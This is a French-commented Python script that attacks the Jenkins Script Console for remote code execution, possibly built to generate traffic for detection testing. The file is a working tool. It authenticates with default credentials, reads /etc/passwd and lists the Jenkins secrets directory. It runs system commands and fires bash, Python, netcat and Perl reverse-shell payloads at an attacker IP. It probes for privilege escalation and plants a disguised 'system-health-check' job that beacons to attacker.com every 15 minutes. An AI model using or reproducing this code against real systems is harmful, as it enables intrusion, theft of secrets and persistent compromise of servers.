#!/usr/bin/env python3
"""
Script d'attaque RCE via Jenkins Script Console
Exploitation du Groovy Script Console pour exécuter du code arbitraire
MITRE ATT&CK: T1059.007 - Command and Scripting Interpreter: JavaScript
"""

import requests
import time
import argparse
from datetime import datetime
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

class JenkinsScriptConsoleRCE:
    def __init__(self, base_url, username="admin", password="admin"):
        self.base_url = base_url.rstrip('/')
        self.username = username
        self.password = password
        self.session = requests.Session()
        self.authenticated = False
        
    def authenticate(self):
        """Authentification"""
        try:
            crumb_url = f"{self.base_url}/crumbIssuer/api/json"
            response = self.session.get(crumb_url, auth=(self.username, self.password), verify=False)
            if response.status_code == 200:
                crumb_data = response.json()
                self.session.headers.update({
                    crumb_data['crumbRequestField']: crumb_data['crumb']
                })
                self.authenticated = True
                print(f"[{datetime.now()}] Authentification réussie")
                return True
        except Exception as e:
            print(f"[{datetime.now()}] Erreur d'authentification: {e}")
        return False
    
    def execute_groovy_script(self, script):
        """Exécute un script Groovy via la Script Console"""
        if not self.authenticated:
            print(f"[{datetime.now()}] ERREUR: Non authentifié")
            return None
        
        try:
            script_url = f"{self.base_url}/script"
            data = {'script': script}
            
            response = self.session.post(
                script_url,
                data=data,
                auth=(self.username, self.password),
                verify=False
            )
            
            print(f"[{datetime.now()}] RCE - Script exécuté [HTTP {response.status_code}]")
            
            if response.status_code == 200:
                # Le résultat est dans le HTML, on extrait le contenu
                if 'Result:' in response.text:
                    return response.text
                return "Script exécuté avec succès"
            
            return None
            
        except Exception as e:
            print(f"[{datetime.now()}] RCE ERROR: {e}")
            return None
    
    def reconnaissance(self):
        """Collecte d'informations système"""
        print(f"\n[{datetime.now()}] === RECONNAISSANCE ===")
        
        scripts = {
            "Version Jenkins": "println Jenkins.instance.version",
            "Utilisateur système": "println System.getProperty('user.name')",
            "Répertoire home": "println System.getProperty('user.home')",
            "OS": "println System.getProperty('os.name') + ' ' + System.getProperty('os.version')",
            "Architecture": "println System.getProperty('os.arch')",
            "Java version": "println System.getProperty('java.version')",
            "Liste plugins": """
Jenkins.instance.pluginManager.plugins.each { plugin ->
    println plugin.getDisplayName() + ': ' + plugin.getVersion()
}
""",
            "Liste utilisateurs": """
Jenkins.instance.securityRealm.allUsers.each { user ->
    println user.id
}
"""
        }
        
        for name, script in scripts.items():
            print(f"\n[{datetime.now()}] Collecte: {name}")
            result = self.execute_groovy_script(script)
            if result:
                print(f"  Résultat obtenu")
            time.sleep(1)
    
    def file_system_access(self):
        """Accès au système de fichiers"""
        print(f"\n[{datetime.now()}] === ACCÈS SYSTÈME FICHIERS ===")
        
        scripts = {
            "Liste /etc": """
new File('/etc').listFiles().each { file ->
    println file.name
}
""",
            "Lecture /etc/passwd": """
println new File('/etc/passwd').text
""",
            "Liste répertoire Jenkins": """
new File('/var/jenkins_home').listFiles().each { file ->
    println file.name + ' - ' + file.length() + ' bytes'
}
""",
            "Secrets Jenkins": """
def secretsDir = new File('/var/jenkins_home/secrets')
if (secretsDir.exists()) {
    secretsDir.listFiles().each { file ->
        println file.name
    }
}
"""
        }
        
        for name, script in scripts.items():
            print(f"\n[{datetime.now()}] Tentative: {name}")
            result = self.execute_groovy_script(script)
            if result:
                print(f"  Accès réussi")
            time.sleep(2)
    
    def command_execution(self):
        """Exécution de commandes système"""
        print(f"\n[{datetime.now()}] === EXÉCUTION COMMANDES ===")
        
        commands = [
            "whoami",
            "id",
            "pwd",
            "ls -la /",
            "ps aux",
            "netstat -tulpn",
            "cat /etc/issue",
            "uname -a"
        ]
        
        for cmd in commands:
            print(f"\n[{datetime.now()}] Commande: {cmd}")
            script = f"println '{cmd}'.execute().text"
            result = self.execute_groovy_script(script)
            if result:
                print(f"  Commande exécutée")
            time.sleep(2)
    
    def reverse_shell_attempt(self, attacker_ip, attacker_port):
        """Tentative de reverse shell"""
        print(f"\n[{datetime.now()}] === REVERSE SHELL ===")
        print(f"  - IP attaquant: {attacker_ip}")
        print(f"  - Port: {attacker_port}")
        
        # Plusieurs payloads de reverse shell
        payloads = [
            # Bash
            f"bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1",
            # Python
            f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{attacker_ip}\",{attacker_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            # Netcat
            f"nc -e /bin/sh {attacker_ip} {attacker_port}",
            # Perl
            f"perl -e 'use Socket;$i=\"{attacker_ip}\";$p={attacker_port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
        ]
        
        for i, payload in enumerate(payloads, 1):
            print(f"\n[{datetime.now()}] Tentative reverse shell #{i}")
            script = f"'{payload}'.execute()"
            result = self.execute_groovy_script(script)
            if result:
                print(f"  Payload exécuté")
            time.sleep(3)
    
    def privilege_escalation(self):
        """Tentatives d'élévation de privilèges"""
        print(f"\n[{datetime.now()}] === ÉLÉVATION PRIVILÈGES ===")
        
        scripts = {
            "Vérif sudo": "println 'sudo -l'.execute().text",
            "SUID files": "println 'find / -perm -4000 2>/dev/null'.execute().text",
            "Capabilities": "println 'getcap -r / 2>/dev/null'.execute().text",
            "Cron jobs": """
println new File('/etc/crontab').text
new File('/var/spool/cron/crontabs').listFiles()?.each { 
    println it.name + ': ' + it.text 
}
"""
        }
        
        for name, script in scripts.items():
            print(f"\n[{datetime.now()}] Tentative: {name}")
            result = self.execute_groovy_script(script)
            if result:
                print(f"  Information collectée")
            time.sleep(2)
    
    def persistence(self):
        """Mise en place de persistence"""
        print(f"\n[{datetime.now()}] === PERSISTENCE ===")
        
        # Créer un job malveillant qui s'exécute périodiquement
        persistence_script = """
// Créer un job de persistence
def jobName = 'system-health-check'
def jobConfig = '''<project>
  <description>System health monitoring</description>
  <keepDependencies>false</keepDependencies>
  <properties/>
  <triggers>
    <hudson.triggers.TimerTrigger>
      <spec>H/15 * * * *</spec>
    </hudson.triggers.TimerTrigger>
  </triggers>
  <builders>
    <hudson.tasks.Shell>
      <command>curl http://attacker.com/beacon</command>
    </hudson.tasks.Shell>
  </builders>
</project>'''

def jenkins = Jenkins.instance
def project = jenkins.createProjectFromXML(jobName, new ByteArrayInputStream(jobConfig.bytes))
println "Job de persistence créé: " + jobName
"""
        
        print(f"[{datetime.now()}] Création job de persistence")
        result = self.execute_groovy_script(persistence_script)
        if result:
            print(f"  Persistence établie")

def main():
    parser = argparse.ArgumentParser(description="Attaque RCE Script Console Jenkins")
    parser.add_argument('--target', default='http://localhost:8080',
                        help='URL de Jenkins')
    parser.add_argument('--user', default='admin',
                        help='Nom d\'utilisateur')
    parser.add_argument('--password', default='admin',
                        help='Mot de passe')
    parser.add_argument('--duration', type=int,
                        help='Durée de l\'attaque en secondes')
    parser.add_argument('--attack-type', 
                        choices=['recon', 'files', 'exec', 'shell', 'privesc', 'persistence', 'all'],
                        default='all',
                        help='Type d\'attaque')
    parser.add_argument('--reverse-ip',
                        help='IP pour reverse shell')
    parser.add_argument('--reverse-port', type=int, default=4444,
                        help='Port pour reverse shell')
    
    args = parser.parse_args()
    
    print(f"\n[{datetime.now()}] === DÉBUT ATTAQUE RCE SCRIPT CONSOLE ===")
    print(f"  - Cible: {args.target}")
    print(f"  - Type: {args.attack_type}\n")
    
    attacker = JenkinsScriptConsoleRCE(args.target, args.user, args.password)
    
    if not attacker.authenticate():
        print(f"[{datetime.now()}] ERREUR: Impossible de s'authentifier")
        return
    
    start_time = time.time()
    
    if args.attack_type in ['recon', 'all']:
        attacker.reconnaissance()
    
    if args.attack_type in ['files', 'all']:
        attacker.file_system_access()
    
    if args.attack_type in ['exec', 'all']:
        attacker.command_execution()
    
    if args.attack_type in ['shell', 'all']:
        if args.reverse_ip:
            attacker.reverse_shell_attempt(args.reverse_ip, args.reverse_port)
        else:
            print(f"[{datetime.now()}] SKIP: Reverse shell (pas d'IP spécifiée)")
    
    if args.attack_type in ['privesc', 'all']:
        attacker.privilege_escalation()
    
    if args.attack_type in ['persistence', 'all']:
        attacker.persistence()
    
    duration = time.time() - start_time
    
    print(f"\n[{datetime.now()}] === FIN ATTAQUE RCE ===")
    print(f"  - Durée: {duration:.2f}s\n")

if __name__ == "__main__":
    main()
